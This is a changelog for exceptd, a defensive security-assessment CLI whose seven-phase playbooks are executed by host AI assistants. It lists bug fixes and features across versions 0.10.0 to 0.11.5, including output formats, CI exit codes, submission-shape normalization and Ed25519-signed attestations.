- **#85 `from_observation` always null.** The diagnostic field on `indicators_evaluated[]` is now populated with the observation key that drove each indicator outcome (when supplied via flat-shape observation + indicator + result). Lets operators trace "which observation produced this verdict" without guessing.

- **#86 / #76 `--format garbage` was silent.** v0.11.4 fixed it for `run`; this release fixes the same surface on `ci`. Both now emit `{ok:false, error, verb}` JSON to stderr with non-zero exit when an unknown format is requested.

- **#90 legacy verbs in help.** v0.10.x legacy verbs (plan / govern / direct / look / scan / dispatch / etc) appeared in the help output alongside their v0.11 replacements. Operators copy-pasting from `exceptd help | grep '^  [a-z]'` ended up using legacy verbs and missed the new ones. Each legacy entry is now prefixed with `[DEPRECATED]` so the grep pattern still excludes them.

### Deferred (confirmed not yet shipped)

- **#88 default-output flip incomplete.** `emit()` indents JSON on TTY (improvement over compact JSON); `discover`/`doctor`/`ask`/`refresh` use custom human renderers. `brief`/`run`/`attest list`/`lint` still emit JSON because their data is too rich for a compact human view. Indented-JSON-on-TTY is the v0.11.x answer; per-verb human renderers continue to be incremental.

- **#89 warn-level preconditions exit 0.** `on_fail: halt` correctly exits 1; `on_fail: warn` exits 0 with `preflight_issues` populated. The operator wants warn-level to also fail CI gates — `--strict-preconditions` flag deferred to v0.11.6. Today: use `exceptd ci` for CI gates (correctly maps detected/escalate to exit 2).

### Test infrastructure

- New: `tests/operator-bugs.test.js` (27 cases, all green). Future bug fixes land here as named cases so the audit script becomes part of CI.

## 0.11.4 — 2026-05-12

**Patch: high-impact #71 fix + items 72-77.**

### Critical fix

- **#71 detect didn't accept indicator-result synonyms.** Operators submitting flat-shape evidence with `observation.result: "no_hit"` (the standard vocabulary for years of CI/security tooling) hit the runner's strict `hit|miss|inconclusive` set, falsed every comparison, and ended up with `classification: "inconclusive"` regardless of evidence. This silently broke the new flat-shape submission UX that v0.11.0/v0.11.3 was built around. Same evidence in the legacy `signal_overrides` shape produced the correct `not_detected` verdict.

  Fix: a `canonicalize()` step in both `normalizeSubmission` and `detect()` maps `no_hit`/`no-hit`/`clean`/`clear`/`not_hit`/`ok`/`pass`/`negative`/`false` → `miss`; `hit`/`detected`/`positive`/`true` → `hit`; `inconclusive`/`unknown`/`unverified`/`null` → `inconclusive`. Operator vocabulary is now normalized to the engine's canonical 3-value set at submission boundary.

- **#77 CSAF/OpenVEX bundles auto-fixed.** Downstream of #71: now that detect actually processes signal_overrides correctly, the per-CVE statements in `bundle.vulnerabilities` / `statements` populate when there are matched_cves.

### Bugs

- **#72 ci --format silently ignored.** `exceptd ci --scope code --format summary` and the bare command emitted byte-identical full bundles (~350 KB). CI gates couldn't get a compact verdict without piping through jq. Now ci honors `--format summary|markdown|csaf-2.0|sarif|openvex` with the same shortcuts as `run --format`. Summary is a single-line JSON with `session_id + playbooks_run + verdict + counts`.
- **#73 `indicators_evaluated` type changed silently.** v0.11.3 introduced it as an integer count; downstream consumers iterating `for i in detect.indicators_evaluated` crashed. Restored to an array of `{signal_id, outcome, confidence}`. Added `indicators_evaluated_count` as a peer field for callers wanting the integer.
- **#76 `ci --format garbage` silent empty stdout.** Invalid format values now return `{ok:false, error, verb:"ci"}` JSON to stderr with exit 2, matching the unified error shape.

### Not addressed in this patch

- **#74 default-output flip still incomplete.** `emit()` indents JSON when stdout is a TTY (improvement over compact), but `brief`/`run`/`attest list`/`lint` still emit JSON, not a custom human form. The richer data on `brief`/`run` doesn't have a natural compact human view. Indented-JSON-on-TTY ships as the v0.11.x answer; a true human renderer per verb is deferred. `discover`/`doctor`/`ask`/`refresh` continue with their custom renderers.
- **#75 preflight-blocked exit 0 for warn-level.** `on_fail: halt` preconditions correctly exit 1; `on_fail: warn` preconditions correctly exit 0 with `preflight_issues` populated. The operator wants warn-level to also fail CI — that's a `--strict-preconditions` flag, deferred to v0.11.5. Today: use `exceptd ci` for CI gates (correctly maps detected/escalate to exit 2); `run` is for single-investigation invocations where warn-level info is appropriate.

### Already shipped (cross-referenced)

- #78 `doctor --fix` (v0.11.2).

## 0.11.3 — 2026-05-12

**Patch: operator-reported item #71 + full feature audit findings.**

A full audit across v0.10.0 → v0.11.2 features (64 surface elements: bug fixes, new verbs, flags, output formats, integration paths) confirmed 62/64 work as documented; this release fixes the 2 real gaps the audit found plus closes operator-reported #71.

### Bugs

- **#71 lint accepted half-shape submissions the runner couldn't drive detect with.** Operators submitting flat-shape evidence with `observations: { "<artifact-id>": { captured, value } }` (no `indicator + result` inline) passed lint with zero warnings, then got `detect.classification: "inconclusive"` from the runner because nothing drove indicator decisions. The flat-shape migration was half-complete: validator accepted the new shape; runner couldn't consume it.

  Fixes:
  - **Lint** now warns `observation_lacks_indicator_result` per captured artifact that lacks `indicator + result` AND no `verdict.classification` is supplied, plus an `info` saying "detect will be inconclusive". Operators see the gap before paying the run cost.
  - **`normalizeSubmission`** previously bailed when the submission already had any nested key (`signals`, `artifacts`, `signal_overrides`) — including when the CLI itself had injected `signals._bundle_formats` for `--format` support. Now shape detection prioritizes `observations` / `verdict` and merges any pre-existing nested keys into the normalized output.
  - **`detect` output** surfaces `observations_received`, `signals_received`, `indicators_evaluated`, `classification_override_applied`, and `submission_shape_seen` so operators can see exactly what the runner consumed from their submission. Pre-0.11.3 an inconclusive verdict was opaque.

- **`attest export --format csaf` was a no-op.** The `--format` flag is registered as a multi-flag (returning an array), but the export subverb compared `format === "csaf"` directly against the array, falsing every time. Operators always got the plain redacted-JSON export regardless of the flag. Now unwrapped + normalizes `csaf-2.0` → `csaf` so both shortcuts hit the CSAF envelope path.

### Audit pass — verified working as documented

Smoke-tested 64 features across v0.10.0–v0.11.2. The full list:

- **Bug regressions:** skill not-found JSON, unknown-command JSON, prefetch --quiet summary, validate-cves --offline, --mode validation, --session-key hex validation, framework-gap NIST normalization, default-stdin on pipe, --json-stdout-only stderr silence, mutex lockfile released after run, session-id collision refusal, --operator persistence, --ack persistence, --diff-from-latest, reattest --latest.
- **Verbs:** brief (incl. --all / --phase), discover, doctor (all four sub-checks), ask (incl. synonym routing), lint (catches missing artifacts), ci (incl. --scope code alignment with discover), watch, verify-attestation alias, run-all alias, attest list/show/verify/export/diff/diff --against.
- **Run flags:** --evidence, --evidence-dir, --vex, --explain, --signal-list, --format summary/markdown/sarif/openvex (--format csaf fixed here), --diff-from-latest, --ci, --force-overwrite.
- **Attestation root:** EXCEPTD_HOME respected, --attestation-root respected, legacy + new root both scanned by `findSessionDir`.
- **Catalog tooling:** validate-cves --since filter, refresh --no-network / --indexes-only routing, report csaf envelope.
- **Flat submission shape:** verdict.classification propagates, observation + indicator + result drives detect, smart precondition auto-detect resolves cwd_readable / host.platform / agent_has_command.
- **First-run welcome.**

### Audit pass — known false positives

- **`exceptd watch`** prints `"[orchestrator] Starting event watcher..."` not `"Listening"` — works correctly; my test string was wrong.

## 0.11.2 — 2026-05-12

**Patch: operator-reported items 58-70 from real CLI use.**

### Bugs

- **#58 `ask` non-functional.** Even literal token "secrets" returned `matched: []`. Root cause: tokenizer required length > 3 (dropped "PQC"/"MCP") and the search index covered only `domain.name + attack_class + first sentence of threat_context`. Rewritten with: (a) length >= 2 token filter, (b) synonym map (`credential` → secret/key/token/...; `supply chain` → sbom/dependency/...; `pqc` → post-quantum/ml-kem/...), (c) richer index covering id + name + attack_class + atlas_refs + attack_refs + cwe_refs + frameworks_in_scope + theater_fingerprints.claim + full threat_context + framework_lag_declaration + skill_chain + collection_scope, (d) ID match scores 3× (so `ask secrets` routes to the secrets playbook). Default output now human-readable; `--json` for machine.
- **#59 `--format` flag was no-op.** Documented values produced standard JSON unconditionally. Wired through: `--format summary` emits a single-line JSON digest; `--format markdown` emits an operator-readable markdown report; `--format csaf-2.0|sarif|openvex` emits the corresponding bundle from `close.evidence_package.bundles_by_format`. Unknown values rejected with a list of valid options.
- **#60 Default output flipped (partial).** `emit()` now detects `stdout.isTTY` — interactive use gets indented JSON (massively more readable); piped use stays compact. Override via `--pretty` (always indent) or `EXCEPTD_RAW_JSON=1`. Verbs with dedicated human renderers (`discover`, `doctor`, `ask`) still use them.
- **#61 doctor summary contradicted its findings.** Output said "all checks green" directly above `[!!] private key MISSING`. Now: signing-check severity is `warn` when key absent; summary distinguishes errors vs warnings (`X fail / Y warn`); icon shows `[!! warn]` instead of `[ok]`. Warnings don't force exit 1 (CI still ok) but the visible state matches.
- **#62 `watch` verb missing.** The deprecation map said `watchlist → watch` but `watch` returned unknown-command. Added `watch` as orchestrator passthrough aliased to `watchlist` (same function).
- **#63 `discover` vs `ci --scope code` mismatch.** discover recommended 5 playbooks; ci ran 4 (different sets). ci now includes cross-cutting playbooks (`framework`) regardless of scope, and for `--scope code` on a git repo with a lockfile, also includes `sbom` (system-scope but repo-relevant). Aligns with discover's recommendations.
- **#65 `refresh --no-network` / `--indexes-only` silently no-op.** v0.11.0 deprecation pointers said `prefetch → refresh --no-network` and `build-indexes → refresh --indexes-only`, but the underlying refresh script ignored those flags. Now: CLI translates them at dispatch time — `refresh --no-network` routes to the `prefetch` script; `refresh --indexes-only` routes to `build-indexes`.
- **#66 `ai-run` shell-pipe unusable.** `echo '{...}' | exceptd ai-run secrets` failed with "stdin closed without an evidence event" because shell heredocs close stdin before the streaming protocol expects the wrapped `{event:evidence}` frame. Fix: when streaming mode hits EOF without a wrapped event, parse the raw stdin as a bare submission object and run with it. Operators no longer need an interactive harness for the common single-shot case.
- **#64 verified.** `ok:false` from `on_fail: halt` preconditions correctly exits 1 (kernel-on-Windows reproducer). The user's `exceptd run secrets` cases were `on_fail: warn` preconditions where exit 0 is correct (run completed with warning). No regression in v0.11.x; the user's stale install may have shown different behavior.

### Features

- **#67** `ask` routing index — same fix as #58.
- **#68** `--format summary` single-line digest — same fix as #59. Returns: `{ok, playbook, session_id, classification, rwep, blast_radius, matched_cves, feeds_into, jurisdiction_clocks, evidence_hash}`. Useful for GH Actions annotation lines.
- **#69** `doctor --fix` automatically runs `node lib/sign.js generate-keypair` when the private-key check is the only failing warning. Closes the most-common discovered-issue → manual-fix-recipe loop.
- **#70** `run --format markdown` emits an operator-readable per-run digest (classification, RWEP, matched CVEs, recommended remediation, notification clocks, feeds_into).

### Already shipped (cross-referenced)

- `attest diff <a> --against <b>` (was v0.11.0 #56) — works as documented.

## 0.11.1 — 2026-05-12

**Patch: operator-reported items 47-57.**

### Bugs

- **#48 report self-describing header.** `report executive` / `technical` / `compliance` previously emitted identical `# exceptd Security Assessment Report` headers — only stderr (`[orchestrator] Generating <X> report`) distinguished them, so a piped-to-file report had no internal provenance. Now: `# exceptd Executive Report` / `Technical Report` / `Compliance Report` + an HTML-comment marker (`<!-- exceptd-report:flavor=<x> version=<v> -->`) inside the body. Saved files are self-describing.
- **#50 mutex cross-process enforcement.** `_meta.mutex` was documented but only enforced intra-process (in-memory `_activeRuns` Set). Two parallel `exceptd run kernel` + `exceptd run hardening` invocations in separate shells would race. Now: runner writes a `.exceptd/locks/<playbook>.lock` JSON file (pid + started_at) for the duration of the run; preflight rejects with `blocked_by: mutex` when a non-stale lock exists. Stale locks (dead pid) are auto-GC'd. Released in `finally`.
- **#51 deprecation message version-aware.** The banner used to say "Prefer `brief --all` (v0.11.0)" unconditionally; operators on v0.10.x reading it would find no `brief` command in their install. Now: banner shows the installed version explicitly and conditionally emits "available in this install" vs "upgrade to v0.11.0+ first."
- **#47 / #49 exit-code + skill-not-found shapes.** Verified still correct in v0.11.0 — exit 1 on `ok:false`, JSON shape for `skill <missing>`. No regression; added regression test coverage.

### Features

- **#54 `--json-stdout-only`** — silences ALL stderr emissions (deprecation banners, unsigned-attestation warnings, hook output). Operators piping JSON results through `jq` or scripting exit codes get clean stdout exclusively. Real errors (uncaught exceptions starting with "Error") still pass through.
- **#55 `report csaf`** — emits a CSAF 2.0 envelope of the full assessment (findings + dispatch plan + skill currency + host context). Pipes directly into VEX downstream tooling.
- **#57 default-stdin on pipe.** `exceptd run <playbook>` now auto-detects piped stdin (`process.stdin.isTTY === false`) and assumes `--evidence -`. Operators forgetting the flag no longer hit a precondition halt.

### Already-existing surface (cross-referenced in operator report)

- #52 brief lands before deprecating look — already shipped in v0.11.0
- #53 doctor verb — already shipped in v0.11.0
- #56 cross-session diff — already exists as `attest diff <a-sid> --against <b-sid>` (v0.11.0)

## 0.11.0 — 2026-05-12

**Minor: architectural CLI redesign — 21 verbs collapsed to 11. Plus operator-reported items 31-46.**

### New canonical surface

| New verb | Replaces |
|---|---|
| `brief [playbook]` | plan + govern + direct + look |
| `run [playbook]` | run + ingest (unchanged but with flat submission shape) |
| `ai-run <playbook>` | new — JSONL streaming variant for AI conversational flow |
| `attest <subverb> <sid>` | reattest + list-attestations (now `attest diff` + `attest list`) |
| `discover` | scan + dispatch (recommends playbooks based on cwd) |
| `doctor` | currency + verify + validate-cves + validate-rfcs + signing-status |
| `ci` | new — one-shot CI gate |
| `ask "<question>"` | new — plain-English routing to playbook(s) |
| `lint <playbook> <evidence>` | new — pre-flight submission shape check |
| `verify-attestation <sid>` | alias for `attest verify` |
| `run-all` | alias for `run --all` |

`exceptd` with no args now prints a welcome with two ways to start (`discover` / `ask`) plus common starting playbooks for code / Linux / AI service contexts.

### Default output flip

Old default was JSON one-line; `--pretty` for humans. Reads weird for the operator audience. v0.11.0 flips:

- **Default: human-readable** (5-10 line summary per phase) for `discover` / `doctor` / `ci` / others.
- `--json` for machine consumption.
- `--json --pretty` for indented JSON.

Seven-phase verbs (`brief` / `run`) still emit JSON by default since their consumers are predominantly AI assistants and CI pipelines — switching them would break every existing script.

### Flat submission shape

The runner now accepts a flatter submission shape — one row per observation, indicator inline:

```json
{
  "observations": {
    "env-files":   { "captured": true, "value": "none tracked", "indicator": "env-file-leak", "result": "no_hit" },
    "repo-context": "ok"
  },
  "verdict": { "theater": "actual_security", "classification": "clean", "blast_radius": 0 }
}
```

Nested v0.10.x shape (`artifacts` / `signal_overrides` / `signals` / `precondition_checks`) still works — the runner normalizes either shape internally.

### Smart precondition auto-detect

Mechanically-answerable preconditions (`host.platform == 'linux'`, `cwd_readable`, `agent_has_command('uname')`) are now resolved by the runner itself. The AI only declares preconditions that require intent ("operator authorized this scan"). Reduces evidence-JSON friction by ~80% for typical runs.

### Attestation root relocated

Default attestation root moved from cwd-relative `.exceptd/attestations/` to `~/.exceptd/attestations/<repo-or-host-tag>/`. Repo tag is derived from `git config --get remote.origin.url` + branch when in a git repo, else `host:<hostname>`. Means `attest list` works regardless of which directory you happened to run from.

Override via:
- `--attestation-root <path>` flag
- `EXCEPTD_HOME` env var (uses `$EXCEPTD_HOME/attestations/`)
- Legacy cwd-relative `.exceptd/` still scanned by `attest list` / `findSessionDir` so prior data isn't orphaned.

### Bug fixes (operator-reported items 31-46)

- **#31 / #41 session-id collision** — Pre-0.11.0 a `--session-id` collision silently overwrote the prior attestation (data loss + tamper-evidence violation). Now refuses with exit 3 by default; `--force-overwrite` allows replacement and persists `prior_evidence_hash` + `prior_captured_at` so the audit chain survives.
- **#32 `--mode` validation** — was silently accepting any string. Now validates against `[self_service, authorized_pentest, ir_response, ctf, research, compliance_audit]`.
- **#33 `--session-key` hex validation** — was silently accepting any string. Now requires hex (0-9, a-f) and a minimum length of 16.
- **#34 reattest no artifact diff** — `attest diff <sid> --against <other-sid>` (or `reattest` default replay) now emits per-artifact diff: `{added, removed, changed, unchanged_count}` with value previews. Per-signal-override diff also included.
- **#35 validate-cves crash** — `sources/validators/` was missing from package.json `files` allowlist. Fixed in v0.10.3; still re-tested in v0.11.0.
- **#36 unsigned attestation warning** — Runs without `.keys/private.pem` now emit one stderr warning per process: "attestation will be written UNSIGNED — enable Ed25519 signing: node lib/sign.js generate-keypair". Suppress with `EXCEPTD_UNSIGNED_WARNED=1`.

### Feature additions (operator items)

- **#38 `lint <playbook> <evidence>`** — Pre-flight check: detects missing required artifacts, unknown signal keys, unsupplied preconditions. Operators iterate on submission JSON before paying the phase-4-7 cost.
- **#39 `run --format summary`** — 5-line digest emit format for CI workflows (verdict + RWEP + blast + remediation).
- **#43 reattest cross-session compare** — `attest diff <a-sid> --against <b-sid>` now compares two sessions side-by-side instead of always replaying the same submission.
- **#46 plan / brief description always present** — Directive entries in plan output now always include a `description` field (falls back through `directive.description` → playbook `direct.threat_context` first sentence → `domain.name`).

### Deprecation

v0.10.x verbs (`plan` / `govern` / `direct` / `look` / `ingest` / `reattest` / `list-attestations` / `scan` / `dispatch` / `currency` / `verify` / `validate-cves` / `validate-rfcs` / `watchlist` / `prefetch` / `build-indexes`) still work but emit a one-time deprecation banner per process pointing at the v0.11.0 replacement. Removed in v0.12.

Suppress the deprecation banner: `EXCEPTD_DEPRECATION_SHOWN=1`.

## 0.10.3 — 2026-05-12

**Patch: 14 operator-reported items — 5 bugs + 9 features.**

### Bugs

1. **`exceptd validate-cves` crashed with `MODULE_NOT_FOUND`** in the installed npm package because `sources/` wasn't in the `files` allowlist. Two-part fix: (a) `sources/validators/` added to `package.json` `files`; (b) `runValidateCves` now wraps the require in the same try/catch graceful-fallback pattern `runValidateRfcs` was already using, so the command degrades to offline mode instead of crashing.
2. **Inconsistent error shapes across verbs.** `exceptd <unknown>` and `exceptd skill <missing>` emitted plain stderr text while seven-phase verbs emitted structured JSON. Unified: every CLI verb now emits `{ok:false,error,hint,verb}` JSON on error so operators piping through `jq` get one shape.
3. **`prefetch --no-network --quiet` was completely silent on success.** Now emits a one-line `prefetch summary: …` unconditionally; `--quiet` suppresses only the per-entry chatter.
4. **`plan --directives` exposed `id + title + applies_to` only — no `description`.** Now also surfaces a `description` field (falls back through explicit `directive.description` → `phase_overrides.direct.threat_context` → playbook-level `direct.threat_context` first sentence → `domain.name`) plus a `threat_context_preview`. Operators / AIs get operator-facing prose, not just an ID + enum.
5. **Analyst verbs (`scan`/`dispatch`/`currency`/`watchlist`/`report`) defaulted to human-readable text** while every seven-phase verb defaulted to JSON. Added `--json` flag passthrough across all analyst verbs. Operators scripting around both surfaces now have a consistent switch.

### Features

6. **`run --explain` dry-run** — emits preconditions, required + optional artifacts (with fallback notes), recognized signal keys with types + deterministic flags, and a `submission_skeleton` JSON the operator can fill in. No detect/analyze/validate/close happens. Lets operators preview before assembling evidence.
7. **`attest <subverb> <session-id>`** — `attest export` emits redacted JSON for audit submission (strips raw artifact values, preserves evidence_hash + signature + classification + RWEP + remediation choice + residual risk acceptance). `--format csaf` wraps the export in a CSAF envelope. `attest verify` checks the `.sig` sidecar against `keys/public.pem` and reports tamper status. `attest show` emits the full unredacted attestation.
8. **`run --signal-list`** — lighter than `--explain`; enumerates only the signal_overrides keys the detect phase recognizes plus the four valid `detection_classification` values. Closes the "agent submits a key and runner silently ignores it" gap (v0.10.1 bug #5).
9. **Continuous-compliance: `run --evidence-dir <dir>`** — each `<playbook-id>.json` under the directory becomes that playbook's submission in a multi-playbook run. One cron job → full posture in one CSAF bundle. Pairs with `run --all`.
10. **`validate-cves` + `validate-rfcs` gained `--since <ISO|YYYY-MM-DD>`** — scope-limit validation to entries whose `last_updated` / `cisa_kev_date` / `last_verified` / `published` is on or after the date. Cuts upstream calls for fleet operators running cron.
11. **Ed25519-signed attestations** — every `attestation.json` now gets a `<file>.sig` sidecar. With `.keys/private.pem` present, the runner signs (matches the existing skill-signing convention). Without a private key, writes an `unsigned` marker file so downstream tooling can distinguish "operator declined signing" from "the .sig file was deleted by an attacker." `attest verify` cross-checks the signature against `keys/public.pem`.
12. **`run --operator <name>`** — binds the attestation to a specific human or service identity. Persisted under `attestation.operator` for multi-operator audit-trail accountability.
13. **`run --ack`** — explicit operator consent to the jurisdiction obligations surfaced by `govern`. Persisted under `attestation.operator_consent = { acked_at, explicit: true }`. Without `--ack`, the field is null (consent implicit / unverified).
14. **`run --format <fmt>` repeatable** — emit the close.evidence_package in additional formats alongside the playbook-declared primary. Supported: `csaf-2.0` (primary), `sarif` (2.1.0 — GitHub Code Scanning / VS Code SARIF Viewer / Azure DevOps), `openvex` (0.2.0 — sigstore / in-toto / GUAC consumers), `markdown` (human review). Extras populate `close.evidence_package.bundles_by_format`.

### Internal

- `lib/playbook-runner.js` `buildEvidenceBundle` now handles `csaf-2.0`, `sarif` (with per-CVE rules + properties), `openvex` (with status derived from active_exploitation + live_patch_available), and `markdown`.
- `bin/exceptd.js` `maybeSignAttestation` helper uses the same Ed25519 primitive as `lib/sign.js` against `.keys/private.pem`.
- CSAF envelope cvss_v3.base_score now reflects the catalog's real cvss_score (previously hardcoded 0).
- `submission.signals._bundle_formats` is the agent-side hook for requesting extra formats.

## 0.10.2 — 2026-05-12

**Patch: v0.10.1 deferred set — framework-gap filter fix, VEX consumption, CI gating, drift mode, 2 new playbooks (13 total), feeds_into matrix.**

### Bug fix (carried from v0.9.x)

**`exceptd framework-gap NIST-800-53 <cve-id>` returned 0 matches** while `framework-gap all <cve-id>` correctly found the same gap. Root cause: catalog stores `g.framework = "NIST SP 800-53 Rev 5"` (spaces) but operators pass `NIST-800-53` (hyphens), and `.includes()` is case + format sensitive. Fix: normalize both sides via `.toLowerCase().replace(/[\s_-]/g, '')` then substring-match against `g.framework` value AND prefix-match against the gap KEY (e.g. `NIST-800-53-SI-2`).

### New CLI flags

- **`run --vex <file>`** — load a CycloneDX or OpenVEX document. CVEs marked `not_affected | resolved | false_positive` (CycloneDX) or `not_affected | fixed` (OpenVEX) drop out of `analyze.matched_cves`. Dropped CVEs surface under `analyze.vex.dropped_cves` so the disposition is preserved for the audit trail.
- **`run --ci`** — machine-readable verdict for CI gates. Exits 2 when `phases.detect.classification === 'detected'` OR (`classification === 'inconclusive'` AND `rwep.adjusted >= rwep_threshold.escalate`). Logs PASS/FAIL reason to stderr. Pure not_detected runs exit 0 even when the playbook's catalogued CVEs carry high baseline RWEP — the gate is about the host-specific verdict, not the catalog.
- **`run --diff-from-latest`** — compare evidence_hash against the most recent prior attestation for the same playbook in `.exceptd/attestations/`. Drift mode for cron baselines. Result includes `prior_session_id`, `prior_captured_at`, `prior_evidence_hash`, `new_evidence_hash`, `status: unchanged | drifted | no_prior_attestation_for_playbook`.
- **`reattest --latest [--playbook <id>] [--since <ISO>]`** — find the most-recent attestation automatically. No session-id required.

### New playbooks (12 → 13)

- **`crypto-codebase`** (scope: code, attack_class: pqc-exposure) — complements the host-side `crypto` playbook. Walks the codebase for in-source crypto choices: weak hash imports (MD5/SHA1), `Math.random()` in security context, PBKDF2 iteration counts, ECDSA curve choices, RSA bit-size constants, PQC adoption signals. Theater fingerprints include `pqc-ready-feature-flag-without-ml-kem` (config toggle with zero ML-KEM call sites), `fips-validated-by-linking-openssl` (link-time vs runtime FIPS provider), `pbkdf2-iterations-set-in-2015` (10k defaults in published packages).
- **`library-author`** (scope: code, attack_class: supply-chain) — audits what you SHIP, not what you run. Vendored deps, SBOM signing posture, SLSA provenance attestation, VEX issuance, npm provenance, Rekor entries, cosign signing, branch protection, OIDC vs static publish tokens, EU CRA Art.13/14 conformity. Distinct from `sbom` (install-side); this is publish-side. Mutex with `secrets` since both compete for repo-walk cycles.

### feeds_into threshold matrix (v0.10.2 doc pass)

AGENTS.md now ships the full feeds_into matrix — 25 chains across 12 playbooks. Documents what triggers what, so operators understand the suggested-next-playbook routing rather than treating it as opaque magic. Highlights:

- `framework` is the natural correlation layer — many playbooks chain into it on `analyze.compliance_theater_check.verdict == 'theater'`.
- `sbom` is the breadth-of-impact follow-up most playbooks suggest when `analyze.blast_radius_score >= 4`.
- `kernel + hardening + runtime` form a tightly-coupled triangle (any one raises questions in the other two).
- `always` conditions on `hardening → kernel`, `runtime → kernel`, `runtime → hardening`, `containers → secrets` — the AI should always at least offer the next playbook to the operator.

### Internal

- **kernel.json feeds_into typo fix** — `compliance-theater` referent (no such playbook ID) corrected to `framework` (the playbook carrying the compliance-theater attack class). Test updated to assert the corrected chain.
- **`vexFilterFromDoc` helper** in `lib/playbook-runner.js` — parses CycloneDX VEX or OpenVEX documents into a `Set<string>` of CVE IDs whose disposition is "not_affected" or equivalent.
- **AGENTS.md** — new "feeds_into threshold matrix" section + "CLI reference" table.

### Still deferred (next pass)

- crypto-codebase playbook ships `eu-ai-act` and `cmmc` in `frameworks_in_scope` but doesn't thread either into `framework_gap_mapping` — Hard Rule #4 (no orphaned references) tidy. Either drop the entries or add concrete mapping in a follow-up.
- Crypto-codebase byte size (95 KB) is above the 50-60 KB target for new playbooks — load-bearing content but worth a depth audit.
- `_meta.feeds_into[].condition` parser supports a limited DSL — some playbooks use expressions like `any matched_cve.attack_class IN ['ai-c2', 'prompt-injection']` that the current parser doesn't fully support. Conditions degrade silently to false. Worth a parser pass to either expand the DSL or warn on unknown shapes.

## 0.10.1 — 2026-05-12

**Patch: operator-reported bugs from v0.10.0 first contact + scope-aware `run` default.**

### New: `_meta.scope` + scope-aware multi-playbook `run`

Pre-0.10.1, `exceptd run` required a single explicit `<playbook>`. Operators had to know which of the 11 playbooks fit their context. Now:

- `exceptd run` (no args) auto-detects cwd: `.git/` → code playbooks; `/proc` + `/etc/os-release` → system playbooks. Always includes `cross-cutting`.
- `exceptd run --scope <type>` runs all playbooks matching `system | code | service | cross-cutting | all`.
- `exceptd run --all` runs every playbook.
- `exceptd run <playbook>` (explicit) keeps its existing behavior.

Each shipped playbook now carries `_meta.scope`:
- **system**: kernel · hardening · runtime · sbom · cred-stores
- **code**: secrets · containers
- **service**: mcp · ai-api · crypto
- **cross-cutting**: framework

Multi-playbook runs share one `session_id`; per-playbook attestations land under `.exceptd/attestations/<session_id>/<playbook_id>.json`. Aggregate output reports `summary.{succeeded, blocked, detected, inconclusive}`.

`exceptd plan` now groups output by scope by default with a `scope_summary` count. `--flat` returns the old flat list. `--scope <type>` filters.

### Bug fixes from operator first-contact

1. **Per-verb `--help` printed missing-arg errors.** `exceptd run --help` returned `{"ok":false,"error":"run: missing <playbookId> positional argument."}` instead of usage. Now every playbook verb (`plan`/`govern`/`direct`/`look`/`run`/`ingest`/`reattest`) honors `--help`/`-h` before positional validation and emits per-verb usage with flag descriptions, invocation modes, and `precondition_checks` submission shape.

2. **Preconditions were invisible to the host AI.** Neither `govern` nor `look` surfaced `_meta.preconditions`, so the AI couldn't see what facts to declare in its submission. `run` would then halt with `precondition_unverified` and the AI was blind. Fix: `look` response now includes `preconditions: [{id, check, on_fail, description}]` plus a `precondition_submission_shape` field giving the literal JSON shape (`{ "precondition_checks": { "<id>": true } }`) and an example. AGENTS.md updated.

3. **`precondition_checks` submission shape was undocumented in errors.** Preflight halt now returns a `remediation` field with the exact submission hint per failed precondition.

4. **`matched_cves` violated AGENTS.md Hard Rule #1.** Pre-0.10.1 output emitted `[{cve_id, rwep, cisa_kev, active_exploitation, ai_discovered}]` only — missing CVSS score/vector, KEV due date, PoC availability, AI-assisted-weaponization flag, patch availability, live-patch availability, EPSS, affected_versions, ATLAS/ATT&CK refs. The framework's own hard rule (every CVE reference must carry CVSS + KEV + PoC + AI-discovery + active-exploitation + patch/live-patch availability — theoretical-only is refused) was violated by the runner itself. Fix: `analyze.matched_cves[]` entries now carry all 15 required + optional Hard Rule #1 fields populated from the catalog. Null only when the catalog lacks the value, never when the runner forgot to forward.

5. **`detect.classification` ignored `signals.detection_classification`.** Agent could submit `{"detection_classification":"clean"}` with all-miss `signal_overrides` and still get `inconclusive`. Fix: agent override honored when set to `detected | inconclusive | not_detected | clean` (alias). Engine-computed classification used as fallback.

6. **`compliance_theater_check.verdict` stuck at `pending_agent_run` when classification was clear.** When the framework playbook ran with clean `detect.classification = not_detected`, the theater verdict still came back as pending instead of `clear`. Fix: when agent didn't submit `theater_verdict`, engine derives one from classification (`not_detected` → `clear`; otherwise `pending_agent_run`). Aliases `clean` / `no_theater` map to `clear`.

7. **No directive discoverability.** `exceptd plan` showed directive counts but not IDs/titles. Fix: `exceptd plan --directives` expands each playbook entry with `directives: [{id, title, applies_to}]`.

8. **No attestation inventory command.** Operators accumulated attestations under `.exceptd/attestations/` with no inventory verb; discovery required shell-globbing. Fix: new `exceptd list-attestations [--playbook <id>]` enumerates every prior session, sorted newest-first, with truncated evidence_hash + capture timestamp + file path.

### Deferred from operator report

These were noted in the same report and are scoped to v0.10.2 / v0.11:

- `framework-gap <framework> <cve-id>` named-framework filter doesn't match by gap-id prefix (carried over from v0.9.x).
- Crypto-codebase / library-internal playbook variant (new attack class for library authors).
- Framework-author operator persona (audit what you ship, not what you run).
- `reattest --latest <playbook>` / `--since <date>` (no need to know session-id).
- `run --diff-from-latest` for cron-driven baselines.
- `run --ci` exit-code-based gating for `.github/workflows/`.
- VEX consumption in sbom (`run sbom --vex vex.cdx.json` drops `known_not_affected` from analyze output).
- feeds_into threshold matrix documentation.

## 0.10.0 — 2026-05-11

**Minor: seven-phase playbook contract. exceptd becomes a knowledge layer that AI assistants consume, not a parallel scanner.**

### What changed at the architectural level

Pre-v0.10 `exceptd scan` shelled out from Node (`uname`, `openssl`, `kpatch list`, environment-variable inspection) — duplicating what host AIs like Claude Code already do better with their native `Bash`/`Read`/`Grep`/`Glob`. The new contract inverts the relationship: exceptd ships playbooks under `data/playbooks/*.json`; the host AI executes the host-side work; exceptd applies the knowledge + GRC layer around it.

The contract has seven phases:

**govern → direct → look → detect → analyze → validate → close**

exceptd owns govern / direct / analyze / validate / close (the knowledge + GRC work). The host AI owns look / detect (artifact collection + indicator evaluation against raw captures).

### New schema

`lib/schemas/playbook.schema.json` — JSON Schema (Draft 2020-12, ~33 KB) covering every required field of the seven-phase contract. Key features:

- `_meta`: id + version + `last_threat_review` + `threat_currency_score` (auto-block <50, warn <70) + `changelog[]` + `owner` + `air_gap_mode` + `preconditions[]` (halt/warn/skip_phase) + `mutex[]` + `feeds_into[]`.
